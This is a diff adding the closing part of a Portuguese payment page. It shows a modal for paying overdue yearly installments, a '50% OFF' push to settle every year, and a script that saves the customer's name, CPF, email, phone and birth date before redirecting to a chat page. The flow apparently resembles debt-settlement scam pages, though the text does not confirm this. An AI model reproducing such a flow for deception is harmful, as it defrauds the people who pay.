+                        <p class="text-sm font-bold text-amber-900 flex items-center gap-1.5">
+                            <span>⚠️</span> Parcela de 2020 selecionada
+                        </p>
+                        <p class="text-xs text-amber-800">Você está pagando apenas a parcela obrigatória de 2020 no valor integral de <strong class="text-amber-950">R$ ${fmtValor(valoresAnos['2020'])}</strong>.</p>
+                        
+                        <div class="bg-blue-50 border border-blue-200 rounded-lg p-3 space-y-2">
+                            <p class="text-xs font-bold text-blue-950">🔥 Aproveite o Desconto de 50%:</p>
+                            <p class="text-xs text-blue-900 leading-snug">
+                                Adicione os outros anos e pague <strong>apenas metade (50% OFF)</strong> de cada parcela adicional!
+                            </p>
+                            <button type="button" onclick="selecionarTodosAnosEConfirmar()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold text-xs py-2 px-3 rounded-lg transition-all shadow-sm">
+                                ⚡ Quitar Tudo com 50% OFF
+                            </button>
+                        </div>
+
+                        <p class="text-xs text-amber-800">Deseja prosseguir apenas com esta parcela?</p>
+                    </div>
+                `;
+            } else {
+                html = `
+                    <div class="bg-blue-50 border border-blue-200 rounded-xl p-4 space-y-3">
+                        <p class="text-sm font-bold text-blue-900">✓ Resumo do pagamento</p>
+                        <p class="text-xs text-blue-800">Anos selecionados: <span class="font-semibold">${anosComValores}</span></p>
+                        
+                        <div class="bg-white/90 rounded-lg p-3 text-xs space-y-1 border border-blue-200">
+                            <div class="flex justify-between items-center">
+                                <span class="text-gray-500">Valor total bruto:</span>
+                                <span class="line-through text-red-500">R$ ${fmtValor(totalBruto)}</span>
+                            </div>
+                            <div class="flex justify-between items-center font-bold text-emerald-700 text-sm">
+                                <span>Valor final a pagar:</span>
+                                <span>R$ ${fmtValor(totalFinal)}</span>
+                            </div>
+                            <div class="text-right text-[0.7rem] text-emerald-600 font-semibold">
+                                Economia (50% OFF nos adicionais): R$ ${fmtValor(descontoAdicional)}
+                            </div>
+                        </div>
+
+                        <div class="bg-blue-100/70 border border-blue-200 rounded-lg p-3 space-y-2">
+                            <p class="text-xs font-bold text-blue-950">🔥 Quitação Completa:</p>
+                            <p class="text-xs text-blue-900 leading-snug">
+                                Selecione <strong>todos os anos</strong> para quitar 100% das pendências com 50% de desconto nos adicionais!
+                            </p>
+                            <button type="button" onclick="selecionarTodosAnosEConfirmar()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold text-xs py-2 px-3 rounded-lg transition-all shadow-sm">
+                                ⚡ Quitar Tudo com 50% OFF
+                            </button>
+                        </div>
+
+                        <p class="text-xs text-blue-800">Deseja prosseguir com o pagamento?</p>
+                    </div>
+                `;
+            }
+
+            conteudo.innerHTML = html;
+            modal.classList.remove('hidden');
+        }
+
+        function selecionarTodosAnosEConfirmar() {
+            selecionarTodosAnos();
+            abrirModalConfirmacao();
+        }
+
+        function fecharModalConfirmacao() {
+            const modal = document.getElementById('modal-confirmacao');
+            modal.classList.add('hidden');
+        }
+
+        function confirmarPagamento() {
+            fecharModalConfirmacao();
+            irParaChat();
+        }
+
+        function irParaChat() {
+            const checkboxes = document.querySelectorAll('input[name="anos"]:checked');
+            const anosCheckeds = Array.from(checkboxes).map(cb => cb.value);
+            const totalFormatado = document.getElementById('total-selecionado').textContent;
+            
+            var customerData = {
+                nome:                _customerInfo.nome,
+                cpf:                 _customerInfo.cpf,
+                email:               _customerInfo.email,
+                telefone:            _customerInfo.telefone,
+                nascimento:          _customerInfo.nascimento,
+                parcelasSelecionadas: anosCheckeds,
+                quantidadeParcelas:  anosCheckeds.length,
+                valorTotal:          totalFormatado
+            };
+            try {
+                localStorage.setItem("customerData", JSON.stringify(customerData));
+            } catch (e) {}
+            window.location.href = '../chat/chat/index.html';
+        }
+    </script>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4bc70e2c01a94c73b74392e4234840661791215815920" integrity="sha512-L0ha0OXavK/8okipN9F8BtP84dg9DUhPERbBXzwI6dgTA55d2+yweo3pn5CSFYs45/r8md2+xvUPtTdvTNRfjA==" data-cf-beacon='{"version":"2024.11.0","token":"f0cb857a8dbc47b59d5cd5f71a819492","r":1,"spa":2}' crossorigin="anonymous"></script>
+</body>
+
+
+</html>
+
+
+
